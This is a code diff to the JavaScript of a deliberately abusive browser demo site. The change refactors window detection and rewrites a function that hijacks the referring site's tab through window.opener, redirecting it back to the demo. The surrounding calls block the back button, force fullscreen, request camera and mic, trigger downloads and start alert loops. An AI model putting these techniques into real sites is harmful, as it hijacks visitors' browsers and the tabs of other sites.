@@ -149,6 +149,20 @@ let interactionCount = 0
  */
 let numSuperLogoutIframes = 0
 
+/**
+ * Is this window a child window? A window is a child window if there exists a
+ * parent window (i.e. the window was opened by another window so `window.opener`
+ * is set) *AND* that parent is a window on the same origin (i.e. the window was
+ * opened by us, not an external website)
+ */
+const isChildWindow = (window.opener && isParentSameOrigin()) ||
+  window.location.search.indexOf('child=true') !== -1
+
+/**
+ * Is this window a parent window?
+ */
+const isParentWindow = !isChildWindow
+
 /*
  * Run this code in all windows, *both* child and parent windows.
  */
@@ -159,7 +173,7 @@ init()
  * will be its parent. The `window.opener` variable is a reference to the parent
  * window.
  */
-if (isChildWindow()) initChildWindow()
+if (isChildWindow) initChildWindow()
 else initParentWindow()
 
 /**
@@ -187,7 +201,7 @@ function init () {
     if (event.key === 'Meta' || event.key === 'Control') {
       showModal()
     } else {
-      if (isParentWindow() && Math.random() < 0.20) requestFullscreen()
+      if (isParentWindow && Math.random() < 0.20) requestFullscreen()
       else requestCameraAndMic()
     }
 
@@ -221,12 +235,12 @@ function initParentWindow () {
   blockBackButton()
   fillHistory()
   startInvisiblePictureInPictureVideo()
-  attemptToTakeoverReferrerWindow()
 
   interceptUserInput(event => {
     triggerFileDownload()
 
     if (interactionCount === 1) {
+      attemptToTakeoverReferrerWindow()
       hideCursor()
       startAlertInterval()
       superLogout()
@@ -237,19 +251,6 @@ function initParentWindow () {
 }
 
 /**
- * A window is a child window if there exists a parent window (i.e. the window was
- * opened by another window so `window.opener` is set) *AND* that parent is a window
- * on the same origin (i.e. the window was opened by us, not an external website)
- */
-function isChildWindow () {
-  return window.opener && isParentSameOrigin()
-}
-
-function isParentWindow () {
-  return !isChildWindow()
-}
-
-/**
  * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
  * link in a new window. For example, Messenger.com from Facebook does this.
  * However, that means that `window.opener` will be set, which allows us to redirect
@@ -257,8 +258,8 @@ function isParentWindow () {
  * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
  */
 function attemptToTakeoverReferrerWindow () {
-  if (isParentWindow() && !isParentSameOrigin()) {
-    window.opener.location = 'http://example.com'
+  if (isParentWindow && !isParentSameOrigin()) {
+    window.opener.location = `${window.location.origin}/?child=true`
   }
 }
 
